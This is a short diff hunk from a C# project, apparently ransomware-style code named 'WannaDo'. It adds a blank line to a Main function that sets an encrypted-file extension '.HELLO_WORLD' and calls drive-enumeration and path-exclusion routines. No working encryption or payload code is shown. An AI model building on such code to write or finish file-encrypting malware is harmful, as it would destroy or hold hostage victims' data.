@@ -46,6 +46,7 @@ namespace WannaDo {
 
         ///// MAIN FUNCTION /////
         static void Main (string[] args) {
+            
             string cryptoExt = ".HELLO_WORLD";
             CurrentDrives ();
             AddAvoid ();
